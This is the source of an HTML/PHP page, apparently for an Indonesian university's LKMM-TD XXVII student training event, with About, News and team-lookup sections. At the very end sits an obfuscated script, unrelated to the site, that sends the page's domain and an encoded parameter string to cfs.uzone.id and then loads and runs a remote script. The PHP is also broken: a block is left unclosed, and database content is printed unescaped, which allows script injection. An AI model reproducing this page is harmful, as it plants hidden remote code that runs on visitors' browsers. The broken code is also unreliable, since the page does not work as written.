
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css">
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>LKMM-TD XXVII</title>

    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">

    <script>
        function showTeam(str) {
            if (str.length == 0) { 
                document.getElementById("yourTeam").innerHTML = "";
                return;
            } else {
                var xmlhttp = new XMLHttpRequest();
                xmlhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("yourTeam").innerHTML = this.responseText;
                    }
                }
                xmlhttp.open("GET", "yourteam.php?nrp="+str, true);
                xmlhttp.send();
            }
        }
    </script>

  </head>
  <body>
    <div id="warning">
      <div class="container">
        <center><h4>Please change to landscape mode for better view experience...</h4></center>
      </div>
    </div>
    <div id='tombol'>
    </div>
    <div id="menu">
    <div id="close">X</div>
    <ul id="menumenu">
    	<li><a href="#home">Home</a></li>
    	<li><a href="#about">About</a></li>
    	<li><a href="#news">News</a></li>
    	<li><a href="#team">Team</a></li>
    	<li><a href="#contact">Contact Us</a></li>
    	<li><a href="#faq">FAQ</a></li>
    	<li><a href="#myboard">Student Myboard</a></li>
    	<li><a href="#credits">Developer Credits</a></li>
    </ul>
    </div>
    <!-- HEADER START--> 
    <div id="wrapper">
      <style>
              #home{
                background: url('images/background-siang.png') no-repeat center center scroll;
                -webkit-background-size: 100% 100%;
        				-moz-background-size: 100% 100%;
        				-o-background-size: 100% 100%;
                background-size: 100% 100%;
                width: 100%;
                height: 100%;
                margin-left: 0;
                position: relative;
                z-index: 14 !important;
              }

              #about{
                background: url('images/background-siang.png') no-repeat center center scroll;
                -webkit-background-size: 100% 100%;
        				-moz-background-size: 100% 100%;
        				-o-background-size: 100% 100%;
                background-size: 100% 100%;
                width: 100%;
                height: 100%;
                margin-left: 0;
                position: relative;
                z-index: 14 !important;
              }

              #news{
                background: url('images/background-siang.png') no-repeat center center scroll;
                -webkit-background-size: 100% 100%;
        				-moz-background-size: 100% 100%;
        				-o-background-size: 100% 100%;
                background-size: 100% 100%;
                width: 100%;
                height: 100%;
                margin-left: 0;
                position: relative;
                z-index: 14 !important;
              }

              #news{
                background: url('images/background-siang.png') no-repeat center center scroll;
                -webkit-background-size: 100% 100%;
        				-moz-background-size: 100% 100%;
        				-o-background-size: 100% 100%;
                background-size: 100% 100%;
                width: 100%;
                height: 100%;
                margin-left: 0;
                position: relative;
                z-index: 14 !important;
              }

              #team{
                background: url('images/background-siang.png') no-repeat center center scroll;
                -webkit-background-size: 100% 100%;
        				-moz-background-size: 100% 100%;
        				-o-background-size: 100% 100%;
                background-size: 100% 100%;
                width: 100%;
                height: 100%;
                margin-left: 0;
                position: relative;
                z-index: 14 !important;
              }

              #contact{
                background: url('images/background-siang.png') no-repeat center center scroll;
                -webkit-background-size: 100% 100%;
        				-moz-background-size: 100% 100%;
        				-o-background-size: 100% 100%;
                background-size: 100% 100%;
                width: 100%;
                height: 100%;
                margin-left: 0;
                position: relative;
                z-index: 14 !important;
              }

              #faq{
                background: url('images/background-siang.png') no-repeat center center scroll;
                -webkit-background-size: 100% 100%;
        				-moz-background-size: 100% 100%;
        				-o-background-size: 100% 100%;
                background-size: 100% 100%;
                width: 100%;
                height: 100%;
                margin-left: 0;
                position: relative;
                z-index: 14 !important;
              }

              #myboard{
                background: url('images/background-siang.png') no-repeat center center scroll;
                -webkit-background-size: 100% 100%;
        				-moz-background-size: 100% 100%;
        				-o-background-size: 100% 100%;
                background-size: 100% 100%;
                width: 100%;
                height: 100%;
                margin-left: 0;
                position: relative;
                z-index: 14 !important;
              }

              #credits{
                background: url('images/background-siang.png') no-repeat center center scroll;
                -webkit-background-size: 100% 100%;
        				-moz-background-size: 100% 100%;
        				-o-background-size: 100% 100%;
                background-size: 100% 100%;
                width: 100%;
                height: 100%;
                margin-left: 0;
                position: relative;
                z-index: 14 !important;
              }
        </style><style>
               #wrapper{
          		 background-color: -webkit-linear-gradient(to bottom, #00ffff, #ff9933);
				 background-color: -o-linear-gradient(to bottom, #00ffff, #ff9933);
				 background-color: -moz-linear-gradient(to bottom, #00ffff, #ff9933);
				 background-color: linear-gradient(to bottom, #00ffff, #ff9933);
                 /*background-color: #00ffff;*/
               }
           </style>      <div class="row" id="home">
          <div id="semutsemut">
            <img src="images/ant.gif" id="semut">
          </div>

          <div id="awanawan">
          			            <div class="cloud small cloud-1">
		              <div id="clouds"></div><div id="clouds"></div><div id="clouds"></div><div id="clouds"></div>
		            </div>
		            <div class="cloud normal cloud-2">
		              <div id="clouds"></div><div id="clouds"></div><div id="clouds"></div><div id="clouds"></div>
		            </div>
		            <div class="cloud normal cloud-3">
		              <div id="clouds"></div><div id="clouds"></div><div id="clouds"></div><div id="clouds"></div>
		            </div>
		            <div class="cloud normal cloud-4">
		              <div id="clouds"></div><div id="clouds"></div><div id="clouds"></div><div id="clouds"></div>
		            </div>
		            <div class="cloud small cloud-5">
		              <div id="clouds"></div><div id="clouds"></div><div id="clouds"></div><div id="clouds"></div>
		            </div>
		            <div class="cloud normal cloud-6">
		              <div id="clouds"></div><div id="clouds"></div><div id="clouds"></div><div id="clouds"></div>
		            </div>
		            <div class="cloud small cloud-7">
		              <div id="clouds"></div><div id="clouds"></div><div id="clouds"></div><div id="clouds"></div>
		            </div>
	                  </div>
      </div>
      
      <div class="row" id="about">
      	<div class="container" id="section-about">
      		<div class="col-sm-12" id="section-about-header">
      			<div class="col-sm-6 col-sm-offset-3">
      				<center><h3>About LKMM-TD</h3></center>
      			</div>
      		</div>
      		<div class="col-sm-12" id="section-about-content">
      			<div class="container-fluid">
			      	<p><center>LKMM-TD (Latihan Keterampilan Manajemen Mahasiswa Tingkat Dasar) merupakan kegiatan yang bertujuan untuk mengasah kemampuan manajemen mahasiswa. LKMM-TD XXVII merupakan kegiatan wajib bagi mahasiswa 2016 dan menjadi syarat wisuda. Hadir dengan tema The Extraordinary Worker, LKMM-TD merupakan wadah bagi mahasiswa untuk bertumbuh dan berkembang menjadi pekerja Allah yang berkualitas.</center></p>
			    </div>
      		</div>
      	</div>
      </div>

      <div class="row" id="news">
<div class="container" id="section-news">
         <div class="col-sm-12" id="judul-news">
            <div class="col-sm-6 col-sm-offset-3">
              <center><h3>News</h3><br>
<?php include "connect.php"; ?>
<?php
$sql = "select * from berita order by id desc";
$result = mysql_query($sql);
$count=1;
while($row=mysql_fetch_assoc($result)){
   echo "
  <div id='wrap'>
      <div id='question'>
        <a data-toggle='collapse' href='#".$count."'>
          <i id='plus1' class='glyphicon glyphicon-chevron-down'></i>
            " . $row["judul"]. "
        </a>
      </div>
    </div>
    <div id='".$count."' class='panel-collapse collapse'>
      <div id='wrap'>
            " . $row["konten"]. "
        </p>
      </div>
    </div>";  
  $count=$count+1;
}
              </center>
            </div>
          </div>
      </div>
      </div>

      <div class="row" id="team">
		<div class="container" id="section-team">
			   <div class="col-sm-12" id="judul-team">
      			<div class="col-sm-6 col-sm-offset-3">
      				<center><h3>Team</h3></center>
      			</div>
      		</div>
		<center>
			<form id="form-kelompok">
			NRP:
			<input type="text" id="nrp" name="nrp" style="width: 300px; margin: auto;">
			<button type="button" name="search" onclick="showTeam(document.getElementById('nrp').value)" class="btn btn-default" id="button-team">Search</button>
			</form>
			<div id="yourTeam"></div>
		</center>
		</div>
      </div>

      <div class="row" id="contact">

      </div>

      <div class="row" id="faq">

      </div>

      <div class="row" id="myboard">

      </div>

      <div class="row" id="credits">

      </div>
    </div>

    
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/responsive.js"></script>    
    <script src="js/animasi.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BYA0WnVbRlIoidEsrs0xTzkaJkUp%2fOXlwSzsKbekjBd1jvwie0Kv5Xrk2hpldwkIt8HAA9wR%2fhsJPhoj%2biMgZjJYEiH%2bm2IUHkJLRBGPfeTP5NY7B%2b3bb81Gb8b2Nat%2bQ3NzS09OrJkBiIcMitfptGJ7rbZNjyev2rtAUOoN8AQIazaktvfLIVxdNOeZnVIMJSYYdDUpL8z%2fGzUDYp6nHzK2Ng7KN8QFuR9FM29Ik5jxODJzCDT%2bjZ1VMqvy0xlxXT1%2bsAztznW07IQ5FwlT71cV1J0QSBvWmH4xZeNDT%2fupPv4BI8e7d50%2fRAd5z%2fPMFSJIktyp%2bwMoshNCFU8MkzQe5Rc4ubrWWd%2fYiuzTh%2fp7FezvrHDEvZMsbomfxSRtv%2b5hP%2bZjpphLwAXeUnX7KSF7RA4RFzPIDXNoWP8MOT7qKN07%2fN7dR9t0kqAw41nie%2b8GoIffS9KjI0Lz%2fmNReZz4qPILwM7c2umbLM1002%2f%2f9ANe7LGew6gO464M9u3mIbfEdd55LDF9g1pxEtPmjdc96T0GyN4hS" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
